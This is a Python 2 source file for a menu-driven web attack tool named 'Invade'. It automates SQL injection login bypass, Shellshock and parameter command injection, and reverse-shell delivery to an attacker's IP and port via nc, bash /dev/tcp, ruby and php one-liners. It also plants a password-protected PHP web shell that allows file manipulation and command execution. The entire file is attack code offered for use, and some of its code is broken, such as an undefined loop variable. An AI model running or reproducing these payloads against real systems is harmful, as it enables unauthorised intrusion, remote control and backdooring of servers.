#imports
import hashlib
import requests
import os

#print banner
print''' _____                    _
|_   _|                  | |
  | | _ ____   ____ _  __| | ___
  | || '_ \\ \\ / / _` |/ _` |/ _ \\
 _| || | | \\ V / (_| | (_| |  __/
 \\___/_| |_|\\_/ \\__,_|\\__,_|\\___|

 Authors: 3XPL017 & Zchap & TDHU & SodiumHydroxide
 Date created (US format): 11/11/2017
                                 '''
#mainmenu                                
mainmenu = '''choices:
    exit
    clear
    [1]show_help
    [2]SQLI_bypass_login_forms 
    [3]typical_shellshock(blind)
    [4]netcat_shellshock
    [5]typical_command_injection(blind)
    [6]netcat_command_injection
    [7]trespass_XSS\n'''
print(mainmenu)


#define
def SQLI_bypass_login_forms():
    #take raw_inputs
    user=raw_input("user: ")
    postu=raw_input("post parameter for username: ")
    postp=raw_input("post parameter for password: ")
    print" "
    
    #get URL
    URL=raw_input("URL: ")
    w=raw_input("word on login: ")
    #SQLI tests
    r=requests.post(URL, data={postu:user+"\'--",postp:"ghghhghhhgh"})
    if w in r.text:
        print"potential SQLI detected with "+user+"\'-- as user and any password!"
    r=requests.post(URL, data={postu:user,postp:"\' or ' 1=1"})
    if w in r.text:
        print"potential SQLI detected with "+user+" as user and \' or ' 1=1 as password!"
    r=requests.post(URL, data={postu:user+"\')--",postp:"ghghhghhhgh"})
    if w in r.text:
        print"potential SQLI detected with "+user+"\')-- as user and any password!"
    r=requests.post(URL, data={postu:user,postp:"\') or ' 1=1"})
    if w in r.text:
        print"potential SQLI detected with "+user+" as user and \') or ' 1=1 as password!"
    r=requests.post(URL, data={postu:user+"\"--",postp:"ghghhghhhgh"})
    if w in r.text:
        print"potential SQLI detected with "+user+"\"-- as user and any password!"
    r=requests.post(URL, data={postu:user,postp:"\" or ' 1=1"})
    if w in r.text:
        print"potential SQLI detected with "+user+" as user and \" or ' 1=1 as password!"
    
#define typical_shellshock
def typical_shellshock(): 

    #display message
    print"shellshock \ntype exit to quit \n"
    
    #get URL
    URL=raw_input("URL: ")
    
    #make command var
    command=""
    
    #loop
    while URL != "exit" and command != "exit":
    
        #take command
        command=raw_input("command to run: ")
        if URL != "exit" and command != "exit":
        
            #exploit
            os.system("curl -A \"User-Agent: () { :; }; "+command+"\""+URL)

#define  netcat_shellshock
def netcat_shellshock():

    #take raw_inputs
    URL=raw_input("URL: ")
    IP=raw_input("your IP: ")
    PORT=raw_input("PORT: ")
    
    #exploit
    os.system("curl -A \"User-Agent: () { :; }; nc -e /bin/sh "+IP+" "+PORT+"\""+URL)
    os.system("curl -A \"User-Agent: () { :; }; bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1\""+URL)
    os.system("curl -A \"User-Agent: () { :; }; ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\""+URL)
    i=3
    
    #loop
    while i < 9:
        i=str(i)
        os.system("curl -A \"User-Agent: () { :; }; php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i+"\");'\""+URL)
        i=int(i)
        i+=1
    print"to see if a reverse shell has opened listen with netcat"

#define typical_command_injection   
def typical_command_injection():

    #display message
    print"command injection \ntype exit to quit \n"
    
    #get URL
    URL=raw_input("URL: ")
    
    #make command var
    command=""
    
    #take raw_inputs
    reqtype=raw_input("request type: ").lower()
    parameter=raw_input("parameter: ")
    
    #loop
    while URL != "exit" and command != "exit" and reqtype != "exit":
        command=raw_input("command to run: ")
        if URL != "exit" and command != "exit" and reqtype == "post":
            requests.post(URL, data={parameter:";"+command})
        if URL != "exit" and command != "exit" and reqtype== "get":
            requests.get(URL+"?"+parameter+"=;"+command)
            
#define netcat_command_injection
def netcat_command_injection(): 

    #get URL
    URL=raw_input("URL: ")
    
    #take raw_inputs
    reqtype=raw_input("request type: ").lower()
    parameter=raw_input("parameter: ")
    IP=raw_input("your IP: ")
    PORT=raw_input("PORT: ")
    
    #exploit for post
    if reqtype == "post":
        requests.post(URL, data={parameter:";nc -e /bin/sh "+IP+" "+PORT})
        requests.post(URL, data={parameter:";bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1"})
        requests.post(URL, data={parameter:";ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"})
        
        #loop
        while i < 9:
            i=str(i)
            requests.post(URL, data={parameter:";php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i})
            i=int(i)
            i+=1
            
    #exploit for get
    if reqtype == "get":
        requests.get(URL+"?"+parameter+"=;nc -e /bin/sh "+IP+" "+PORT)
        requests.get(URL+"?"+parameter+"=;bash -i >& /dev/tcp/"+IP+"/"+PORT+"0>&1")
        requests.get(URL+"?"+parameter+"=;ruby -rsocket -e'f=TCPSocket.open(\""+IP+"\","+PORT+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
        
        #loop
        while i < 9:
            i=str(i)
            requests.get(URL+"?"+parameter+"=;php -r '$sock=fsockopen(\""+IP+"\","+PORT+");exec(\"/bin/sh -i <&"+i+" >&"+i+" 2>&"+i)
            i=int(i)
            i+=1
            
    #display message
    print "to see if a reverse shell has opened listen with netcat!"

#define trespass_XSS    
def trespass_XSS():

    #take raw_inputs
    passwd=raw_input("password: ")
    passwd = hashlib.md5(passwd.encode())
    passwd = passwd.hexdigest()
    URL=raw_input("URL: ")
    parameter=raw_input("parameter: ")
    
    #exploit
    requests.post(URL, data={parameter:"<?php $pass = $_POST[\"pass\"];if (md5($pass) == \"" + passwd + "\"){$hostdata = $_POST['hostdata'];if ($hostdata==\"get\"){echo php_uname();}$file = $_POST[\"filename\"];$command = $_POST['command'];echo exec($command);$content = $_POST[\"content\"];file_put_contents($file, $content);$addtofile = $_POST[\"addtofile\"];$addcontent = file_get_contents($addtofile);$addcontent .= $_POST[\"addcontent\"];file_put_contents($addtofile, $addcontent);$view = $_POST[\"view\"];echo file_get_contents($view);$mkdir = $_POST[\"mkdir\"];mkdir($mkdir);$rmdir = $_POST[\"rmdir\"];rmdir($rmdir);$oldname =  $_POST[\"oldname\"];$newname =  $_POST[\"newname\"];rename($oldname, $newname);$delete = $_POST[\"delete\"];unlink($delete);$iwantls = $_POST['iwantls'];if($iwantls == \"true\"){$ls = $_POST['ls'];$dir = opendir($ls);$item = readdir($dir);while(($item = readdir($dir)) !== FALSE){echo ' ';echo $item;}}}else{echo \"nope\";}?>"})

    #display message
    print("if the attack worked you should be able to connect to a trespass backdoor on the page in the URL you provided. ")
    
#select from mainmenu
while True:
    option=raw_input("main: ")
    if option == "exit":
        exit()
    elif option == "clear":
        os.system("clear")
    elif option == "1" or option == "show_help":
        print(mainmenu)
    elif option == "2" or option == "SQLI_bypass_login_forms":
        SQLI_bypass_login_forms()
    elif option == "3" or option == "typical_shellshock":
        typical_shellshock()
    elif option == "4" or option == "netcat_from_shellshock":
        netcat_shellshock()
    elif option == "5" or option == "typical_command_injection":
        typical_command_injection() 
    elif option == "6" or option == "netcat_from_command_injection":
        netcat_command_injection()
    elif option == "7" or option == "trespass_XSS":
        trespass_XSS()
